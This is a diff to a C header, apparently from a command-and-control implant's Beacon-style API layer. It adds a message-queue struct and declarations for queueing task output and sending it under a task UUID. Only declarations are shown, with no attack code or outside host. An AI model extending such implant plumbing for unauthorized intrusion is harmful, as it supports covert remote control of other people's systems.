@@ -1,5 +1,6 @@
 #pragma once
 #include "hannibal.h"
+#define MAX_MESSAGE_SIZE 0x1000
 
 /* data API */
 typedef struct {
@@ -8,6 +9,12 @@ typedef struct {
 	int    length;  /* remaining length of data */
 	int    size;    /* total size of this buffer */
 } datap;
+
+typedef struct _MESSAGE_QUEUE { 
+	unsigned int size; 
+	LPCWSTR content; 
+	struct _MESSAGE_QUEUE* next;	
+} MESSAGE_QUEUE, *PMESSAGE_QUEUE;	
 
 void    BeaconDataParse(datap* parser, char* buffer, int size);
 int     BeaconDataInt(datap* parser);
@@ -31,3 +38,8 @@ int ParseInt32(PBYTE* args);
 char* ParseString(PBYTE* args);
 LPCWSTR ParseWideString(PBYTE* args);
 void BeaconCharToWideString(char* str, wchar_t* wideStr);
+
+PMESSAGE_QUEUE BeaconCreateMessageQueue();
+BOOL BeaconAddMessageToQueue(PMESSAGE_QUEUE root, LPCWSTR message);
+BOOL BeaconCleanUpMessageQueue(PMESSAGE_QUEUE root);
+BOOL BeaconSendAllMessages(PMESSAGE_QUEUE root, LPCSTR task_uuid);
